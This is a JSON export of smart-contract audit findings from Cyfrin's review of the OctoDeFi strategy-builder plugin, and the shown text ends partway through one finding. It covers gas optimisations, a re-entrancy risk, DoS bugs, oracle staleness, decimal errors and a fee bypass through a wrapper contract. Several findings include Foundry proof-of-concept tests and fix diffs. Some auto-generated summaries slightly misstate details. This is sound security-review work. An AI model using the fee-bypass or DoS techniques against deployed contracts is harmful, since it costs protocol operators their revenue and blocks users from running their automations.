{
  "category": "Oracle",
  "total_findings": 515,
  "fetched_at": "2026-01-29T13:01:08Z",
  "findings": [
    {
      "id": "61612",
      "title": "Array length used in multiple loop iterations can be cached",
      "impact": "GAS",
      "content": "**Description:** When validating strategy steps, the length is retrieved for each loop iteration when it could instead be cached to save gas:\n\n```solidity\nfunction _validateSteps(StrategyStep[] memory steps) internal pure {\n    for (uint256 i = 0; i < steps.length; i++) {\n        _validateStep(steps[i], steps.length);\n    }\n}\n```\n\n**OctoDeFi:** Fixed in PR [\\#23](https://github.com/octodefi/strategy-builder-plugin/pull/23).\n\n**Cyfrin:** Verified. The length is now cached.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61611",
      "title": "Use named return variables",
      "impact": "GAS",
      "content": "**Description:** There are a number of instances where named return variables could be used to avoid unnecessary stack variable assignments, for example in `FeeHandler._tokenDistribution()`. Consider modifying this and other relevant functions to save gas.\n\n**OctoDeFi:** Fixed in PR [\\#22](https://github.com/octodefi/strategy-builder-plugin/pull/22).\n\n**Cyfrin:** Verified. Name return variables are now used.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61610",
      "title": "Unused cached value of `getStorageId(msg.sender, id)`",
      "impact": "GAS",
      "content": "**Description:** `createAutomation()` calls `getStorageId(msg.sender, id)` twice—once for `automationSID` and again when assigning `_newAutomation`. This duplicates the same keccak 256 computation and extra stack writes.\n\n**Recommended Mitigation:** Store the first return value in a local variable and reuse it:\n\n```solidity\nbytes32 automationSID = getStorageId(msg.sender, id);\nAutomation storage _newAutomation = automations[automationSID];\n```\n\nThis saves one `STATICCALL`/`KECCAK256` operation and a few stack ops per invocation.\n\n**OctoDeFi:** Fixed in PR [\\#21](https://github.com/octodefi/strategy-builder-plugin/pull/21).\n\n**Cyfrin:** Verified. The cached value is now used.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61609",
      "title": "Condition addresses can re-enter `StrategyBuilderPlugin`",
      "impact": "LOW",
      "content": "**Description:** Condition addresses can re-enter `StrategyBuilderPlugin` from the external call in `_changeStrategyInCondition()` and similarly in `_changeAutomationInCondition()`. In the latter case, it seems that the worst thing that can happen here is duplicating the array entry when pushing to `strategiesUsed` which corrupts `automationsToIndex` and prevents the duplicate from being removed (unless there is re-entrancy during the deletion as well). Impact is therefore limited, but it is important to be aware of this when making any future modifications.\n\n**OctoDeFi:** Acknowledged. We have taken note of the reentry issue.\n\n**Cyfrin:** Acknowledged.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61608",
      "title": "Empty strategies can be created due to missing zero length check",
      "impact": "LOW",
      "content": "**Description:** `StrategyBuilderPlugin.createStrategy()` does not currently revert if the `steps` array length is zero. This means strategies can be created that can never be deleted, per the `strategyExist` modifier logic that is applied to `StrategyBuilderPlugin.deleteStrategy()` checking the steps length (which is not enforced to be non-zero):\n\n```solidity\nmodifier strategyExist(address wallet, uint32 id) {\n    if (strategies[getStorageId(wallet, id)].steps.length == 0) {\n        revert StrategyDoesNotExist();\n    }\n    _;\n}\n```\n\n**Impact:** Impact is limited as strategies cannot be created on behalf of other wallets; however this behavior is most likely undesirable.\n\n**Proof of Concept:** The following test can be added to `StrategyBuilderPlugin.t.sol`:\n\n```solidity\nfunction test_createStrategy_Empty() external {\n    uint256 numSteps;\n    IStrategyBuilderPlugin.StrategyStep[] memory steps = _createStrategySteps(numSteps);\n\n    uint32 strategyID = 222;\n    vm.prank(address(account1));\n    strategyBuilderPlugin.createStrategy(strategyID, creator, steps);\n\n    //Assert\n    IStrategyBuilderPlugin.Strategy memory strategy = strategyBuilderPlugin.strategy(address(account1), strategyID);\n\n    assertEq(strategy.creator, creator);\n    assertEq(strategy.steps.length, numSteps);\n\n    vm.prank(address(account1));\n    vm.expectRevert(IStrategyBuilderPlugin.StrategyDoesNotExist.selector);\n    strategyBuilderPlugin.deleteStrategy(strategyID);\n}\n\nfunction test_createStrategy_EmptyNonZeroLength() external {\n    uint256 numSteps = 2;\n    IStrategyBuilderPlugin.StrategyStep[] memory steps = new IStrategyBuilderPlugin.StrategyStep[](numSteps);\n\n    uint32 strategyID = 222;\n    vm.prank(address(account1));\n    strategyBuilderPlugin.createStrategy(strategyID, creator, steps);\n\n    //Assert\n    IStrategyBuilderPlugin.Strategy memory strategy = strategyBuilderPlugin.strategy(address(account1), strategyID);\n\n    assertEq(strategy.creator, creator);\n    assertEq(strategy.steps.length, numSteps);\n\n    vm.prank(address(account1));\n    strategyBuilderPlugin.executeStrategy(strategyID);\n\n    vm.prank(address(account1));\n    strategyBuilderPlugin.deleteStrategy(strategyID);\n}\n```\n\n**Recommended Mitigation:** Consider reverting if the `steps` length is zero. Note that it would still be possible to create what is effectively an empty strategy with non-zero array length by leveraging default condition address as the zero address as shown in the second PoC.\n\n**OctoDeFi:** Fixed in PR [\\#20](https://github.com/octodefi/strategy-builder-plugin/pull/20).\n\n**Cyfrin:** Verified. Additional validation has been implemented to prevent empty strategy steps without conditions or actions.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61607",
      "title": "Positive Pyth oracle exponents should be explicitly handled",
      "impact": "LOW",
      "content": "**Description:** `PriceOracle._scalePythPrice()` assumes that the exponent `_expo` will always be negative:\n\n```solidity\n    function _scalePythPrice(int256 _price, int32 _expo) internal pure returns (uint256) {\n        if (_price < 0) {\n            revert NegativePriceNotAllowed();\n        }\n\n@>      uint256 _absExpo = uint32(-_expo);\n\n        if (_expo <= -18) {\n            return uint256(_price) * (10 ** (_absExpo - 18));\n        }\n\n        return uint256(_price) * 10 ** (18 - _absExpo);\n    }\n```\n\nWhile this assumption is [not likely to be violated](https://x.com/abarbatei/status/1901327645373030711), it is possible for the exponent to be configured as a positive value based on its signed type and usage in [other libraries](https://github.com/pyth-network/pyth-crosschain/blob/main/target_chains/ethereum/sdk/solidity/PythUtils.sol).\n\nIf the protocol were to ever rely on a Pyth oracle with a positive exponent then `uint32(-expo)` could silently underflow, resulting in a huge absolute value and causing execution to revert during the final scaling.\n\n**Recommended Mitigation:** Consider explicitly handling the case where the exponent is positive.\n\n**OctoDeFi:** Fixed in PR [\\#19](https://github.com/octodefi/strategy-builder-plugin/pull/19).\n\n**Cyfrin:** Verified. The positive exponent case is now explicitly handled.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61606",
      "title": "Zero price validation could be included in the price oracle",
      "impact": "LOW",
      "content": "**Description:** `FeeController.calculateTokenAmount()` validates that the price returned by the oracle is non-zero:\n\n```solidity\n    function calculateTokenAmount(address token, uint256 feeInUSD) external view returns (uint256) {\n        bytes32 oracleID = oracle.oracleID(token);\n\n        if (oracleID == bytes32(0)) {\n            revert NoOracleExist();\n        }\n\n        uint256 tokenPrice = oracle.getTokenPrice(token);\n\n@>      if (tokenPrice == 0) {\n            revert InvalidTokenWithPriceOfZero();\n        }\n\n        return feeInUSD * 10 ** 18 / tokenPrice;\n    }\n```\n\nInstead, this could be included in `PriceOracle._scalePythPrice()` which already validates the price is non-negative:\n\n```solidity\n    function _scalePythPrice(int256 _price, int32 _expo) internal pure returns (uint256) {\n@>      if (_price < 0) {\n            revert NegativePriceNotAllowed();\n        }\n        ...\n    }\n```\n\n**Recommended Mitigation:**\n```diff\n    function _scalePythPrice(int256 _price, int32 _expo) internal pure returns (uint256) {\n--      if (_price < 0) {\n++      if (_price <= 0) {\n            revert NegativePriceNotAllowed();\n        }\n        ...\n    }\n\n    function calculateTokenAmount(address token, uint256 feeInUSD) external view returns (uint256) {\n        ...\n--      if (tokenPrice == 0) {\n--          revert InvalidTokenWithPriceOfZero();\n--      }\n\n        return feeInUSD * 10 ** 18 / tokenPrice;\n    }\n```\n\n**OctoDeFi:** Fixed in PR [\\#18](https://github.com/octodefi/strategy-builder-plugin/pull/18).\n\n**Cyfrin:** Verified. The validation is now performed exclusively within the price oracle.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61605",
      "title": "DoS of automation due to potential zero value transfer reverts",
      "impact": "LOW",
      "content": "**Description:** Token burn percentages specified by `primaryTokenBurn` and `tokenBurn` are simply restricted to the range `(0, 100]`. If the burn percentage is configured to 100%, this can result in scenarios where the burn amount in `FeeHandler.handleFee()` returned by `_feeCalculation()` is non-zero while the total fee to be distributed between the beneficiary/creator/vault is zero. While the standard OpenZeppelin ERC-20 implementation does not revert on zero value transfers, and it is unlikely that the burn percentages will be set that high anyway, it is possible and so is advisable to skip transfers in this case if any of the distribution amounts is zero to avoid DoS for token implementations that do revert on zero value transfers.\n\n**Impact:** Automation can revert when attempting to make payment if the burn percentage is configured as 100%.\n\n**Recommended Mitigation:** Similar to the validation on `burnAmount`, only attempt to perform token transfers if the respective beneficiary/creator/vault amounts are non-zero.\n\n**OctoDeFi:** Fixed by PR [\\#14](https://github.com/octodefi/strategy-builder-plugin/pull/14). Due to the introduced pull-based method from M-3, this issue has also been resolved, as no tokens are transferred directly anymore.\n\n**Cyfrin:** Verified. The push transfer pattern has been updated to a pull pattern that resolves this issue.\n\n\\clearpage",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61604",
      "title": "`automationsToIndex` storage is not correctly reset when deleting automations",
      "impact": "LOW",
      "content": "**Description:** When deleting an automation, the logic pops the final element from the `_usedInAutomations` array but fails to correctly reset the `automationsToIndex` mapping storage. Regardless of whether the if statement executes, `automationsToIndex[automationSID]` should be reset to zero whenever there is a deletion:\n\n```solidity\n    function _deleteAutomation(address wallet, uint32 id) internal {\n        bytes32 automationSID = getStorageId(wallet, id);\n        Automation memory _automation = automations[automationSID];\n\n        uint32[] storage _usedInAutomations = strategiesUsed[getStorageId(wallet, _automation.strategyId)];\n\n@>      uint32 _actualAutomationIndex = automationsToIndex[automationSID];\n        uint256 _lastAutomationIndex = _usedInAutomations.length - 1;\n        if (_actualAutomationIndex != _lastAutomationIndex) {\n            uint32 _lastAutomation = _usedInAutomations[_lastAutomationIndex];\n            _usedInAutomations[_actualAutomationIndex] = _lastAutomation;\n@>          automationsToIndex[getStorageId(wallet, _lastAutomation)] = _actualAutomationIndex;\n        }\n        _usedInAutomations.pop();\n\n        _changeAutomationInCondition(\n            wallet, _automation.condition.conditionAddress, _automation.condition.id, id, false\n        );\n\n        delete automations[automationSID];\n\n        emit AutomationDeleted(wallet, id);\n    }\n```\n\n**Impact:** Impact is limited as it seems the mapping will simply be overwritten if the automation is ever added again at the same id, and given `_usedInAutomations` is correctly popped it does not seem that the entry will be erroneously referenced.\n\n**Recommended Mitigation:** Reset the mapping value for the given automation storage id when deleting the corresponding automation.\n\n**OctoDeFi:** Fixed in PR [#17](https://github.com/octodefi/strategy-builder-plugin/pull/17).\n\n**Cyfrin:** Verified. The relevant `automationsToIndex` mapping key is now cleared alongside `automations`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61603",
      "title": "Accumulation of dust amounts due to rounding in `_tokenDistribution()`",
      "impact": "LOW",
      "content": "**Description:** `_tokenDistribution()` computes each share independently with integer division:\n\n```solidity\nfunction _tokenDistribution(uint256 amount) internal view returns (uint256, uint256, uint256) {\n    uint256 beneficiaryAmount = (amount * beneficiaryPercentage) / PERCENTAGE_DIVISOR;\n    uint256 creatorAmount = (amount * creatorPercentage) / PERCENTAGE_DIVISOR;\n    uint256 vaultAmount = (amount * vaultPercentage) / PERCENTAGE_DIVISOR;\n    return (beneficiaryAmount, creatorAmount, vaultAmount);\n}\n```\n\nIf `beneficiaryPercentage + creatorPercentage + vaultPercentage == 10000` but any division truncates, `beneficiaryAmount + creatorAmount + vaultAmount < amount`, leaving 1–2 wei of “dust”.\n\n**Impact:** Dust gradually accumulating lost and never reaching the intended recipients.\n\n\n**Recommended Mitigation:** Calculate `beneficiaryAmount` and `creatorAmount` as above, then set\n```solidity\nvaultAmount = amount - beneficiaryAmount - creatorAmount;\n```\nto guarantee full distribution without dust.\n\n**OctoDeFi:** Fixed in PR [\\#16](https://github.com/octodefi/strategy-builder-plugin/pull/16).\n\n**Cyfrin:** Verified. The `vaultAmount` is now calculated as the remainder after deducting the beneficiary and creator amounts.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61602",
      "title": "Volume-based fee can be bypassed with a wrapper contract",
      "impact": "MEDIUM",
      "content": "**Description:** `_executeAction()` levies a percentage fee only when `FeeController.getTokenForAction()` can map the `(target, selector)` pair to a tracked token. If the mapping is absent it falls back to `minFeeInUSD`.\nAn attacker can therefore wrap any high-value call inside a helper contract that the `FeeController` does not know about.\n*Example – Aave deposit:*\n```text\nUser → StrategyBuilder → AAVEHandler.supplyFor(100 000 USDC) → Aave Pool.supply()\n```\n`AAVEHandler` receives the user’s 100 000 USDC, approves the Aave pool, and supplies on the user’s behalf, returning aUSDC. Because `(AAVEHandler, supplyFor)` is not registered, `getTokenForAction()` returns `(address(0), false)`, so the strategy pays only the minimum fee instead of ~1 000 USDC (1 %). The same trick works for withdrawals, swaps, or any volume-based selector.\n\n```solidity\nfunction _executeAction(address _wallet, Action memory _action) internal returns (uint256 feeInUSD) {\n    (address tokenToTrack, bool exist) =\n        feeController.getTokenForAction(_action.target, _action.selector, _action.parameter);\n    // If the volume token exist track the volume before and after the execution, else get the min fee\n\n    uint256 preExecBalance = exist ? IERC20(tokenToTrack).balanceOf(_wallet) : 0;\n\n    _execute(_wallet, _action);\n\n    IFeeController.FeeType feeType = feeController.functionFeeConfig(_action.selector).feeType;\n\n    if (exist) {\n        uint256 postExecBalance = IERC20(tokenToTrack).balanceOf(_wallet);\n        uint256 volume = feeType == IFeeController.FeeType.Deposit\n            ? preExecBalance - postExecBalance\n            : postExecBalance - preExecBalance;\n\n        feeInUSD = feeController.calculateFee(tokenToTrack, _action.selector, volume);\n    } else {\n        feeInUSD = feeController.minFeeInUSD(feeType);\n    }\n\n    emit ActionExecuted(_wallet, _action);\n}\n```\n**Impact:** Large transactions can be executed while paying the protocol’s minimum flat fee, severely reducing or eliminating expected revenue for executors.\n\n**Recommended Mitigation:** Because this stems from design choices rather than a simple coding bug, solving it on-chain is non-trivial. It is to document the behavior and discuss any design adjustment that can remediate its risk.\n\n**OctoDeFi:** Fixed in PR [\\#25](https://github.com/octodefi/strategy-builder-plugin/pull/25).\n\n**Cyfrin:** Verified. The `ActionRegistry` contract has been added to validate action contracts allowed to be integrated into `StrategyBuilderPlugin`.\n\n\\clearpage",
      "summary": "\nThe bug report describes a problem with the `_executeAction()` function in the `_action` contract. This function is supposed to charge a percentage fee when it can map the `(target, selector)` pair to a tracked token using the `FeeController.getTokenForAction()` function. However, if the mapping is not present, it falls back to charging the minimum fee in USD. This allows attackers to wrap high-value calls inside a helper contract that is not known by the `FeeController`, resulting in them only paying the minimum fee instead of the expected percentage fee. This can lead to a loss of revenue for executors. The recommended solution is to document the issue and discuss possible design changes to address it. The bug has been fixed in the OctoDeFi project and verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61601",
      "title": "DoS of strategy execution due to array indices out of bounds",
      "impact": "MEDIUM",
      "content": "**Description:** `StrategyBuilderPlugin._validateStep()` intends to enforce that the condition results reference a new index that does not exceed the maximum step index:\n\n```solidity\nfunction _validateStep(StrategyStep memory step, uint256 maxStepIndex) internal pure {\n    if (step.condition.result0 > maxStepIndex || step.condition.result1 > maxStepIndex) {\n        revert InvalidNextStepIndex();\n    }\n}\n```\n\nHowever, given `maxStepIndex` is passed as the array length, this fails to account for zero indexing and as a it is possible to add a strategy that reverts during execution due to array index out of bounds if an off-by-one index is specified.\n\n**Impact:** Strategies can be created that will cause DoS of execution.\n\n**Proof of Concept:** The following test can be added to `StrategyBuilderPlugin.t.sol`:\n\n```solidity\nfunction test_executeStrategy_OOB() external {\n    uint256 numSteps = 2;\n    IStrategyBuilderPlugin.StrategyStep[] memory steps = _createStrategySteps(numSteps);\n    steps[0].condition.result0 = 2;\n    steps[0].condition.result1 = 2;\n    uint32 strategyID = 222;\n\n    deal(address(account1), 100 ether);\n\n    //Mocks\n    vm.mockCall(\n        feeController,\n        abi.encodeWithSelector(IFeeController.getTokenForAction.selector),\n        abi.encode(address(0), false)\n    );\n\n    vm.mockCall(\n        feeController,\n        abi.encodeWithSelector(IFeeController.functionFeeConfig.selector),\n        abi.encode(IFeeController.FeeConfig({feeType: IFeeController.FeeType.Deposit, feePercentage: 0}))\n    );\n    vm.mockCall(feeController, abi.encodeWithSelector(IFeeController.minFeeInUSD.selector), abi.encode(0));\n\n    //Act\n    vm.startPrank(address(account1));\n    strategyBuilderPlugin.createStrategy(strategyID, creator, steps);\n\n    strategyBuilderPlugin.executeStrategy(strategyID);\n    vm.stopPrank();\n\n    //Assert\n    assertEq(tokenReceiver.balance, numSteps * 2 * TOKEN_SEND_AMOUNT);\n}\n```\n\n**Recommended Mitigation:** should be >= to account for zero indexing\n\n```diff\n    function _validateStep(StrategyStep memory step, uint256 maxStepIndex) internal pure {\n--      if (step.condition.result0 > maxStepIndex || step.condition.result1 > maxStepIndex) {\n++      if (step.condition.result0 >= maxStepIndex || step.condition.result1 >= maxStepIndex) {\n            revert InvalidNextStepIndex();\n        }\n    }\n```\n\n**OctoDeFi:** Fixed in PR [\\#15](https://github.com/octodefi/strategy-builder-plugin/pull/15).\n\n**Cyfrin:** Verified. Validation now uses the correct operator.",
      "summary": "\nThe report describes a bug in the software code for the Strategy Builder Plugin. The function \"_validateStep()\" is supposed to ensure that a certain condition is met, but it fails to account for zero indexing. This can lead to a denial of service attack when executing a strategy. A proof of concept is provided and a recommended solution is to use the correct operator in the code. The bug has been fixed in the latest version of the software.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61600",
      "title": "Automation DoS via blacklisted or reverting fee recipients",
      "impact": "MEDIUM",
      "content": "**Description:** `FeeHandler.handleFee()` uses `safeTransferFrom()` to forward ERC-20 tokens to `beneficiary`, `creator`, `vault`, and `burnerAddress`. If any of those addresses are **black-listed** by USDT/USDC (transfer returns false) the call reverts.\n`handleFeeETH()` uses `transfer()` which has a limitation of 2300 gas units; if the destination contract’s `receive()` reverts, for example a smart contract wallet that executes more logic than could be covered by the gas limit, the whole automation fails.\n```solidity\nIERC20(token).safeTransferFrom(msg.sender, beneficiary, beneficiaryAmount);\n\nif (creator != address(0)) {\n    IERC20(token).safeTransferFrom(msg.sender, creator, creatorAmount);\n    IERC20(token).safeTransferFrom(msg.sender, vault, vaultAmount);\n} else {\n    IERC20(token).safeTransferFrom(msg.sender, vault, vaultAmount + creatorAmount);\n}\n\nif (burnAmount > 0) {\n    IERC20(token).safeTransferFrom(msg.sender, burnerAddress, burnAmount);\n}\n```\n\n```solidity\npayable(beneficiary).transfer(beneficiaryAmount);\n\nif (creator != address(0)) {\n    payable(creator).transfer(creatorAmount);\n    payable(vault).transfer(vaultAmount);\n} else {\n    payable(vault).transfer(vaultAmount + creatorAmount);\n}\n\nif (burnAmount > 0) {\n    payable(burnerAddress).transfer(burnAmount);\n}\n```\n**Impact:** Denial of service on all future `executeAutomation()` calls for the strategies with a blacklisted or reverting `creator`.\n\n**Recommended Mitigation:** Use a **pull** pattern where each entity could claim fees on its own instead of a push funds model, or `try/catch` around transfers so a single failing destination cannot block execution. Additionally avoid making native token transfers using `transfer()` but rather leverage some library that implements safe native token transfers.\n\n**OctoDeFi:** Fixed in PR [\\#14](https://github.com/octodefi/strategy-builder-plugin/pull/14).\n\n**Cyfrin:** Verified. A withdrawal method has been implemented to allow users to claim their accumulated fee balances. Note that native token transfers still rely on the `transfer()` method which should also be updated. Application of the `nonReentrant()` modifier is also not necessary.\n\n**OctoDeFi:** Fixed in commit [7c48784](https://github.com/octodefi/strategy-builder-plugin/commit/7c48784640163998a9265f580d3b18aa46bc36a6).\n\n**Cyfrin:** Verified. The Solady `SafeTransferLib` is now used for all token transfers.",
      "summary": "\nThe bug report discusses an issue with the `FeeHandler.handleFee()` function in the OctoDeFi strategy builder plugin. This function uses `safeTransferFrom()` to transfer ERC-20 tokens to various addresses, including `beneficiary`, `creator`, `vault`, and `burnerAddress`. However, if any of these addresses are blacklisted by USDT/USDC, the transfer will fail and the entire automation will be blocked. \n\nThe impact of this bug is a denial of service for all future `executeAutomation()` calls for strategies with a blacklisted or failing `creator`. To mitigate this issue, the report recommends using a pull pattern instead of a push model, or implementing a `try/catch` around transfers to prevent a single failure from blocking the entire execution. It also suggests avoiding the use of `transfer()` for native token transfers and using a library that implements safe transfers instead. \n\nThe bug has been fixed in a pull request and verified by Cyfrin. A withdrawal method has also been implemented to allow users to claim their accumulated fee balances. However, the report notes that the `nonReentrant()` modifier is not necessary and the `SafeTransferLib` is now used for all token transfers in the Solady platform.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61599",
      "title": "Missing staleness check in `PriceOracle::getTokenPrice`",
      "impact": "MEDIUM",
      "content": "**Description:** `PriceOracle.getTokenPrice()` relays `pythOracle.getPriceUnsafe()` but never verifies the price **publish time** or confidence interval. A price that is hours old (or intentionally frozen) is accepted as fresh.\n\n```solidity\nfunction getTokenPrice(address _token) external view returns (uint256) {\n    bytes32 _oracleID = oracleIDs[_token];\n\n    if (_oracleID == bytes32(0)) {\n        revert OracleNotExist(_token);\n    }\n\n    PythStructs.Price memory price = pythOracle.getPriceUnsafe(_oracleID);\n\n    return _scalePythPrice(price.price, price.expo);\n}\n```\n\n**Impact:** * Automation fees may be computed from obsolete data, letting attackers over- or under-pay.\n\n**Recommended Mitigation:** Consider using the [getPriceNoOlderThan](https://api-reference.pyth.network/price-feeds/evm/getPriceNoOlderThan) function instead of [getPriceUnsafe](https://api-reference.pyth.network/price-feeds/evm/getPriceUnsafe).\n\n**OctoDeFi:** Fixed in PR [\\#24](https://github.com/octodefi/strategy-builder-plugin/pull/24).\n\n**Cyfrin:** Verified. When the oracle reports prices older than 120 seconds, `PriceOracle` will return 0 such that the minimum fee will be used. This is a good solution, although a 0 price will cause panic revert due to division by zero in `calculateTokenAmount()`.\n\n**OctoDeFi:** Fixed in PR [\\#27](https://github.com/octodefi/strategy-builder-plugin/pull/27).\n\n**Cyfrin:** Verified. The 0 price case is now explicitly handled to avoid reverting and the threshold has been reduced to 60 seconds. It is possible that this threshold could be too restrictive for specific feeds, and it is recommended to be configured on a per-feed basis.\n\n**OctoDeFi:** Regarding the threshold, we also believe that 60 seconds is quite restrictive, especially considering this is a fee calculation and not a vault with collateral at risk.\n\nMost Pyth oracles update roughly every 1–2 seconds for major tokens. However, it's important to note that these are pull-based oracles, so smaller or less liquid tokens could have much slower update rates.\n\nIt might actually make sense to set the threshold much higher to really detect when an oracle is no longer functioning, rather than simply outdated. In any case, we can't fully prevent price manipulation through a single threshold alone.\n\n**Cyfrin:** Acknowledged.",
      "summary": "\nThe report describes a bug in the `PriceOracle.getTokenPrice()` function. The function uses the `pythOracle.getPriceUnsafe()` function to get the latest price, but it does not check the publish time or confidence interval of the price. This means that an old or intentionally frozen price can be accepted as fresh, which could lead to incorrect automation fees being calculated and potential attacks. The recommended solution is to use the `getPriceNoOlderThan` function instead. The bug has been fixed in the latest PRs by OctoDeFi and Cyfrin, but there may still be some concerns about the threshold for detecting outdated prices.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [
        "Oracle"
      ],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61598",
      "title": "Fee calculations break when token decimals are different from 18",
      "impact": "MEDIUM",
      "content": "**Description:** `FeeController.calculateFee()` and `calculateTokenAmount()` implicitly treat every ERC-20 as if it had **18 decimals**, but many popular assets (USDC/USDT = 6, etc.) do not.\nInside `calculateFee` the line\n\n```solidity\nuint256 _feeInUSD = _feeAmount * _tokenPrice / 10**18;\n```\n\ndivides by `1e18` to cancel the **oracle’s** 18-dec scaling, but completely ignores the token’s own decimals. When the token has fewer decimals the resulting “USD value” is shrunk by `10**(18-decimals)`; when it has more decimals it is bloated.\n\nBecause `_executeStep()` **adds** the individual action fees returned by `_executeAction()`, any step that mixes tokens of different precision sums numbers that are not expressed in the same unit:\n\n| Token | Decimals | Fee for $100 volume at 1 % (expected $1 = 1e18) | Fee actually returned |\n|-------|----------|-----------------------------------------------|-----------------------|\n| USDT  | 6        | `1 × 10¹⁸`                                    | `1 × 10⁶` (1 e12 × too low) |\n| DAI   | 18       | `1 × 10¹⁸`                                    | `1 × 10¹⁸` (correct) |\n\nWhen a strategy step executes an action in USDT followed by an action in DAI the total fee becomes:\n\n```\ntotal = 1e6  (USDT)  + 1e18 (DAI)  = 1000000000001000000  wei-USD\n```\n\nbut the **semantically correct** amount should be `2 × 10¹⁸`. Down-stream effects:\n\n\n\n**Impact:** * `StrategyBuilderPlugin.executeAutomation()` compares the aggregated fee against the user-supplied `maxFeeInUSD`. A user can set `maxFeeInUSD = 1.1e18` and still execute both actions (paying the DAI part only) because the mis-scaled USDT fee barely moves the total.\n* The executor misses on revenue on every 6/8/12-dec token; conversely users of exotic high-decimal tokens may be over-charged and see their automations revert with `FeeExceedMaxFee()`.\n\n**Recommended Mitigation:**\n1. **Use token.decimals() instead of 18.**\n   ```solidity\n   uint8 decimals = IERC20Metadata(token).decimals();   // OZ ERC20Metadata\n   uint256 scale = 10 ** decimals;                      // token’s native unit\n\n   // feeAmount is already in token-units\n   uint256 _feeInUSD = _feeAmount * _tokenPrice / scale;  // always 18-dec 